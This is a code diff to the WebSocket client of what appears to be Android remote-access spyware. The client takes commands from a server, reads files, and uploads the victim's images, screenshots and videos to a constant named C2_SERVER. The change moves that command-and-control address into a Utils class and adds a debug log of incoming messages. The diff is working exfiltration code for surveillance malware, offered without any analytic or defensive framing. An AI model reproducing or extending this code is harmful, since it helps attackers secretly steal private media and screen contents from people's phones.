@@ -28,8 +28,6 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
 
     private Context context;
 
-    private static final String C2_SERVER = "https://localhost/";
-
     public WebSocketClient(Context context, URI serverUri) {
         super(serverUri);
         this.context = context;
@@ -42,6 +40,7 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
 
     @Override
     public void onMessage(String message) {
+        Log.d("eeee", message);
         try {
             JSONObject req = new JSONObject(message);
 
@@ -63,7 +62,7 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     data = getFileContent(path);
                     file = new File(path);
 
-                    FileManager.uploadFile(file.getAbsolutePath(), C2_SERVER + "images");
+                    FileManager.uploadFile(file.getAbsolutePath(), Utils.C2_SERVER + "images");
 
                     json.put("res", "image");
                     json.put("filename", Base64.encode(file.getName().getBytes(), Base64.DEFAULT));
@@ -75,7 +74,7 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     data = getFileContent(path);
                     file = new File(path);
 
-                    FileManager.uploadFile(file.getAbsolutePath(), C2_SERVER + "images");
+                    FileManager.uploadFile(file.getAbsolutePath(), Utils.C2_SERVER + "images");
 
                     json.put("res", "image");
                     json.put("filename", Base64.encode(file.getName().getBytes(), Base64.DEFAULT));
@@ -116,7 +115,7 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     data = getFileContent(path);
                     file = new File(path);
 
-                    FileManager.uploadFile(file.getAbsolutePath(), C2_SERVER + "screenshots");
+                    FileManager.uploadFile(file.getAbsolutePath(), Utils.C2_SERVER + "screenshots");
 
                     json.put("res", "screenshot");
                     json.put("filename", Base64.encode(file.getName().getBytes(), Base64.DEFAULT));
@@ -134,7 +133,7 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     data = getFileContent(path);
                     file = new File(path);
 
-                    FileManager.uploadFile(file.getAbsolutePath(), C2_SERVER + "videos");
+                    FileManager.uploadFile(file.getAbsolutePath(), Utils.C2_SERVER + "videos");
 
                     json.put("res", "video");
                     json.put("filename", Base64.encode(file.getName().getBytes(), Base64.DEFAULT));
